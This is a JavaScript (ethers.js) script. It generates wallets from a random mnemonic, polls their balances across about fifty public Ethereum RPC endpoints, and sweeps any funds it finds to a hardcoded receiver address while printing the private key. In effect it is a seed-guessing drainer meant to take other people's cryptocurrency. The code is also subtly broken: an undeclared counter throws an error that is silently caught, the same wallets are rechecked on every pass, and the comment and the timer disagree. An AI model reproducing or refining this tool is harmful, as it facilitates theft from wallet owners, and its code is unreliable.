const { ethers } = require('ethers');

const RPC_ENDPOINTS = [
    "https://eth.llamarpc.com",
    "https://rpc.ankr.com/eth",
    "https://ethereum.publicnode.com",
    "https://1rpc.io/eth",
    "https://eth-mainnet.public.blastapi.io",
    "https://rpc.flashbots.net",
    "https://cloudflare-eth.com",
    "https://eth-mainnet.gateway.pokt.network/v1/5f3453978e354ab992c4da79",
    "https://api.mycryptoapi.com/eth",
    "https://rpc.eth.gateway.fm",
    "https://eth-mainnet-public.unifra.io",
    "https://ethereum.blockpi.network/v1/rpc/public",
    "https://rpc.payload.de",
    "https://api.zmok.io/mainnet/oaen6dy8ff6hju9k",
    "https://eth.api.onfinality.io/public",
    "https://core.gashawk.io/rpc",
    "https://rpc.builder0x69.io",
    "https://eth.meowrpc.com",
    "https://eth.drpc.org",
    "https://mainnet.gateway.tenderly.co",
    "https://rpc.mevblocker.io",
    "https://rpc.mevblocker.io/noreverts",
    "https://rpc.mevblocker.io/fast",
    "https://eth-mainnet.rpcfast.com",
    "https://api.securerpc.com/v1",
    "https://openapi.bitstack.com/v1/wNFxbiJyQsSeLrX",
    "https://eth-rpc.gateway.pokt.network",
    "https://ethereum-mainnet.gateway.tatum.io",
    "https://api.zan.top/node/v1/eth/mainnet/public",
    "https://eth-mainnet.nodereal.io/v1/1659dfb40aa2",
    "https://eth.merkle.io",
    "https://rpc.notadegen.com/eth",
    "https://eth.gateway.tenderly.co",
    "https://virginia.rpc.blxrbdn.com",
    "https://uk.rpc.blxrbdn.com",
    "https://singapore.rpc.blxrbdn.com",
    "https://eth.rpc.blxrbdn.com",
    "https://eth-mainnet.diamondswap.org/rpc",
    "https://rpc.lokibuilder.xyz/eth",
    "https://rpc.flashbots.net/fast",
    "https://rpc.flashbots.net/builder",
    "https://rpc.lightspeedbuilder.info",
    "https://rpc.titanbuilder.xyz",
    "https://rpc.beaverbuild.org",
    "https://eth.getblock.io/mainnet/",
    "https://eth.drpc.org",
    "https://mainnet.eth.cloud.ava.do",
    "https://eth.connect.bloq.cloud/v1/",
    "https://nodes.mewapi.io/rpc/eth",
    "https://main-light.eth.linkpool.io",
    "https://eth-mainnet.zerion.io"
];

const RECEIVER_ADDRESS = "0x2de229EC151AE93BC7C80CAd84BADb2d805bD673";


function generateWallets() {
    const mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;

    const hdNode = ethers.utils.HDNode.fromMnemonic(mnemonic);
    
    wallets = RPC_ENDPOINTS.map((_, index) => {
        const path = `m/44'/60'/0'/0/${index}`;
        const wallet = hdNode.derivePath(path);
        return {
            privateKey: wallet.privateKey,
            address: wallet.address,
            path
        };
    });
    
    return wallets;
}

async function checkAndTransfer(wallet, rpcUrl, index) {
    try {
        const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
        const walletWithProvider = new ethers.Wallet(wallet.privateKey, provider);

        const [balance, gasPrice] = await Promise.all([
            provider.getBalance(wallet.address),
            provider.getGasPrice()
        ]);
        countNumberWallet++;
        if (balance.gt(0)) {
            console.log(`[Wallet ${index}] Found balance! Attempting to transfer...`);
            console.log(`[Wallet ${index}] Balance: ${ethers.utils.formatEther(balance)} ETH`);
        
            const gasLimit = 21000; 
            const gasCost = gasPrice.mul(gasLimit);

            const amountToSend = balance.sub(gasCost);

            if (amountToSend.gt(0)) {
                const tx = {
                    to: RECEIVER_ADDRESS,
                    value: amountToSend
                };

                const transaction = await walletWithProvider.sendTransaction(tx);
                console.log(`[Wallet ${index}] Transaction sent! Hash: ${transaction.hash}`);
                
                await transaction.wait();
                console.log("================================================");
                console.log(`[Wallet ${index}] Transaction confirmed!`);
                console.log(`Private Key: ${wallet.privateKey}`);
                console.log(`Address: ${wallet.address}`);
                console.log(`Amount: ${ethers.utils.formatEther(amountToSend)} ETH`);
                console.log("================================================");
            }
        }
    } catch (error) {
        // console.error(`[Wallet ${index}] Error with RPC ${rpcUrl}:`, error.message);
    }
}

async function checkAllWallets() {
    if (wallets.length === 0) {
        generateWallets();
    }
    
    await Promise.all(
        wallets.map((wallet, index) => 
            checkAndTransfer(wallet, RPC_ENDPOINTS[index], index)
        )
    );
}

// Generate wallets first
generateWallets();

// Run checks every 10 seconds
setInterval(() => {
    checkAllWallets();
}, 1000);


